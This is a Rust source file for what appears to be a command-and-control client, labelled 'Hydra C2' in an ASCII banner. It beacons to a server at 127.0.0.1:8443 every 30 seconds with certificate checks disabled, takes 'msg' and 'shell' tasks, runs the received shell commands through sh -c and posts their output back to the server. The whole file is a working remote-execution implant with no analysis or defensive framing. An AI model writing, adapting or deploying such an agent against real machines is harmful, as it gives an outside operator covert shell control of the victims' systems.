use reqwest::Client;
use std::time::Duration;
use tokio::time::sleep;
use serde_json::Value;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client_id = "DESKTOP-HEAD-ALPHA";
    let server_url = "https://127.0.0.1:8443";

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .use_rustls_tls()
        .build()?;

    println!(r#"
    _    _           _              _____ ___  
   | |  | |         | |            / ____|__ \ 
   | |__| |_   _  __| |_ __ __ _  | |       ) |
   |  __  | | | |/ _` | '__/ _` | | |      / / 
   | |  | | |_| | (_| | | | (_| | | |____ / /_ 
   |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
            __/ |                              
           |___/                               
    >> Desktop Head: Task Queue Active
    "#);

    loop {
        let checkin_url = format!("{}/checkin/{}?platform=desktop", server_url, client_id);

        match client.post(&checkin_url).send().await {
            Ok(response) => {
                if response.status().is_success() {
                    let body: Value = response.json().await?;
                    
                    // --- TASK DISPATCHER ---
                    if let Some(command) = body.get("command") {
                        if !command.is_null() {
                            let action = command["action"].as_str().unwrap_or("");
                            let data = &command["data"];

                            println!("[!] Task Received: {}", action);

                            match action {
                                "msg" => {
                                    let content = data["content"].as_str().unwrap_or("No content");
                                    println!(">> MESSAGE FROM HYDRA: {}", content);
                                }
                                "shell" => {
                                    let cmd_text = data["cmd"].as_str().unwrap_or("");
                                    println!(">> [ACTION] Executing Shell: {}", cmd_text);
                                    
                                    // Execute command on Arch Linux
                                    let output = std::process::Command::new("sh")
                                        .arg("-c")
                                        .arg(cmd_text)
                                        .output();

                                    if let Ok(out) = output {
                                        let stdout = String::from_utf8_lossy(&out.stdout).to_string();
                                        let stderr = String::from_utf8_lossy(&out.stderr).to_string();
                                        let result = if out.status.success() { stdout } else { stderr };

                                        // Send the result back to the server
                                        let report_url = format!("{}/report/{}", server_url, client_id);
                                        let _ = client.post(&report_url)
                                            .json(&serde_json::json!({ "output": result }))
                                            .send()
                                            .await;
                                    }
                                }
                                _ => println!("[?] Unknown action: {}", action),
                            }
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("[!] Connection failed: {}. Retrying...", e);
            }
        }

        sleep(Duration::from_secs(30)).await;
    }
}